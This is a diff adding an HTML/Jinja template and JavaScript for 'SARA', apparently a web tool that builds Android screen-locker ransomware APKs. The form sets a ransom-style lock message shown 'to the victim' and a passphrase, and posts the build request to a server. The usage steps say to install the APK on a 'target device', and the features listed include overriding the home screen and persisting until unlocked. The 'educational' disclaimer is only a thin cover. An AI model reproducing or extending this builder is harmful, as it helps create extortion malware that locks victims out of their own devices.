@@ -1,0 +1,269 @@
+{% extends "base.html" %}
+
+{% block title %}SARA - Screen Locker Builder{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-lg-8 mx-auto">
+        <div class="card bg-secondary">
+            <div class="card-header">
+                <h4 class="card-title mb-0">
+                    <i class="bi bi-lock text-info"></i> Screen Locker Builder
+                </h4>
+            </div>
+            <div class="card-body">
+                <p class="text-muted mb-4">
+                    Create a screen lock ransomware with custom messages and passphrase protection.
+                    The app will lock the device screen until the correct passphrase is entered.
+                </p>
+
+                <form id="screenLockerForm">
+                    <div class="row g-3">
+                        <div class="col-md-6">
+                            <label for="appName" class="form-label">App Name</label>
+                            <input type="text" class="form-control" id="appName" name="name" 
+                                   placeholder="Screen Locker" value="Screen Locker">
+                            <div class="form-text">Name of the screen locker application</div>
+                        </div>
+
+                        <div class="col-md-6">
+                            <label for="appIcon" class="form-label">App Icon</label>
+                            <input type="file" class="form-control" id="appIcon" name="icon" 
+                                   accept=".png,.jpg,.jpeg,.gif">
+                            <div class="form-text">Custom icon for the app (optional)</div>
+                        </div>
+
+                        <div class="col-12">
+                            <label for="appHead" class="form-label">Lock Screen Title</label>
+                            <input type="text" class="form-control" id="appHead" name="head" 
+                                   placeholder="Your Phone Is Locked" value="Your Phone Is Locked">
+                            <div class="form-text">Main title displayed on the lock screen</div>
+                        </div>
+
+                        <div class="col-12">
+                            <label for="appDesc" class="form-label">Lock Screen Message</label>
+                            <textarea class="form-control" id="appDesc" name="desc" rows="3"
+                                      placeholder="locked by sara@termuxhackers-id">locked by sara@termuxhackers-id</textarea>
+                            <div class="form-text">Message displayed to the victim on the lock screen</div>
+                        </div>
+
+                        <div class="col-md-6">
+                            <label for="appKeys" class="form-label">Unlock Passphrase</label>
+                            <input type="text" class="form-control" id="appKeys" name="keys" 
+                                   placeholder="s3cr3t" value="s3cr3t" required>
+                            <div class="form-text">Secret passphrase to unlock the device</div>
+                        </div>
+
+                        <div class="col-md-6">
+                            <div class="form-text mt-4">
+                                <i class="bi bi-key text-warning"></i>
+                                <strong>Remember this passphrase!</strong><br>
+                                It's needed to unlock the device.
+                            </div>
+                        </div>
+
+                        <div class="col-12">
+                            <div class="alert alert-info">
+                                <i class="bi bi-info-circle"></i>
+                                <strong>Note:</strong> The screen locker will take over the device screen and prevent access 
+                                until the correct passphrase is entered. Make sure to remember the passphrase!
+                            </div>
+                        </div>
+
+                        <div class="col-12">
+                            <button type="submit" class="btn btn-info" id="buildBtn">
+                                <i class="bi bi-lock"></i> Build Screen Locker APK
+                            </button>
+                            <a href="{{ url_for('index') }}" class="btn btn-secondary ms-2">
+                                <i class="bi bi-arrow-left"></i> Back to Home
+                            </a>
+                        </div>
+                    </div>
+                </form>
+
+                <!-- Progress Section -->
+                <div id="progressSection" class="mt-4" style="display: none;">
+                    <div class="card bg-dark">
+                        <div class="card-body">
+                            <h6 class="card-title">
+                                <i class="bi bi-gear-fill"></i> Building Screen Locker APK...
+                            </h6>
+                            <div class="progress mb-3">
+                                <div id="progressBar" class="progress-bar progress-bar-striped progress-bar-animated bg-info" 
+                                     role="progressbar" style="width: 0%"></div>
+                            </div>
+                            <p id="progressText" class="mb-0 text-muted">Initializing...</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Result Section -->
+                <div id="resultSection" class="mt-4" style="display: none;">
+                    <div id="resultCard" class="card">
+                        <div class="card-body">
+                            <h6 class="card-title">
+                                <i class="bi bi-check-circle text-success"></i> Build Complete
+                            </h6>
+                            <p id="resultText" class="mb-3"></p>
+                            <div id="passphraseSection" class="alert alert-warning mb-3" style="display: none;">
+                                <i class="bi bi-key"></i>
+                                <strong>Unlock Passphrase:</strong> <span id="passphraseText" class="fw-bold"></span>
+                            </div>
+                            <div id="downloadSection" style="display: none;">
+                                <a id="downloadLink" href="#" class="btn btn-info">
+                                    <i class="bi bi-download"></i> Download Screen Locker APK
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Information Panel -->
+<div class="row mt-4">
+    <div class="col-lg-8 mx-auto">
+        <div class="card bg-dark border-info">
+            <div class="card-header border-info">
+                <h6 class="card-title mb-0">
+                    <i class="bi bi-lightbulb"></i> How it Works
+                </h6>
+            </div>
+            <div class="card-body">
+                <div class="row">
+                    <div class="col-md-6">
+                        <h6 class="text-info">Screen Lock Features:</h6>
+                        <ul>
+                            <li>Overrides device home screen</li>
+                            <li>Prevents access to other apps</li>
+                            <li>Displays custom lock message</li>
+                            <li>Requires passphrase to unlock</li>
+                            <li>Persistent until unlocked</li>
+                        </ul>
+                    </div>
+                    <div class="col-md-6">
+                        <h6 class="text-info">Usage Instructions:</h6>
+                        <ol>
+                            <li>Set custom title and message</li>
+                            <li>Choose a strong passphrase</li>
+                            <li>Install APK on target device</li>
+                            <li>App activates automatically</li>
+                            <li>Enter passphrase to unlock</li>
+                        </ol>
+                    </div>
+                </div>
+                
+                <div class="alert alert-warning mt-3">
+                    <i class="bi bi-exclamation-triangle"></i>
+                    <strong>Security Note:</strong> The passphrase is embedded in the APK. 
+                    Advanced users may be able to extract it through reverse engineering.
+                    This tool is intended for educational and authorized testing purposes only.
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block extra_scripts %}
+<script>
+document.getElementById('screenLockerForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    
+    const buildBtn = document.getElementById('buildBtn');
+    const progressSection = document.getElementById('progressSection');
+    const resultSection = document.getElementById('resultSection');
+    const progressBar = document.getElementById('progressBar');
+    const progressText = document.getElementById('progressText');
+    
+    // Disable form and show progress
+    buildBtn.disabled = true;
+    buildBtn.innerHTML = '<i class="bi bi-gear-fill"></i> Building...';
+    progressSection.style.display = 'block';
+    resultSection.style.display = 'none';
+    
+    try {
+        // Handle file upload if present
+        let iconPath = 'data/tmp/icon.png';
+        const iconFile = document.getElementById('appIcon').files[0];
+        
+        if (iconFile) {
+            progressText.textContent = 'Uploading icon...';
+            progressBar.style.width = '20%';
+            
+            const formData = new FormData();
+            formData.append('icon', iconFile);
+            
+            const uploadResponse = await fetch('/upload_icon', {
+                method: 'POST',
+                body: formData
+            });
+            
+            if (uploadResponse.ok) {
+                const uploadResult = await uploadResponse.json();
+                iconPath = uploadResult.path;
+            }
+        }
+        
+        // Build screen locker
+        progressText.textContent = 'Building screen locker APK...';
+        progressBar.style.width = '50%';
+        
+        const formData = {
+            name: document.getElementById('appName').value || 'Screen Locker',
+            head: document.getElementById('appHead').value || 'Your Phone Is Locked',
+            desc: document.getElementById('appDesc').value || 'locked by sara@termuxhackers-id',
+            keys: document.getElementById('appKeys').value || 's3cr3t',
+            icon: iconPath
+        };
+        
+        const response = await fetch('/build_screen_locker', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(formData)
+        });
+        
+        const result = await response.json();
+        
+        if (response.ok) {
+            progressBar.style.width = '100%';
+            progressText.textContent = 'Build complete!';
+            
+            // Show result
+            resultSection.style.display = 'block';
+            document.getElementById('resultCard').className = 'card bg-success';
+            document.getElementById('resultText').textContent = result.message;
+            
+            // Show passphrase
+            if (result.passphrase) {
+                document.getElementById('passphraseSection').style.display = 'block';
+                document.getElementById('passphraseText').textContent = result.passphrase;
+            }
+            
+            if (result.filename) {
+                document.getElementById('downloadSection').style.display = 'block';
+                document.getElementById('downloadLink').href = `/download/${result.filename}`;
+            }
+        } else {
+            throw new Error(result.error || 'Build failed');
+        }
+        
+    } catch (error) {
+        // Show error
+        resultSection.style.display = 'block';
+        document.getElementById('resultCard').className = 'card bg-danger';
+        document.getElementById('resultText').textContent = `Error: ${error.message}`;
+        document.getElementById('downloadSection').style.display = 'none';
+        document.getElementById('passphraseSection').style.display = 'none';
+    } finally {
+        // Re-enable form
+        buildBtn.disabled = false;
+        buildBtn.innerHTML = '<i class="bi bi-lock"></i> Build Screen Locker APK';
+    }
+});
+</script>
+{% endblock %}
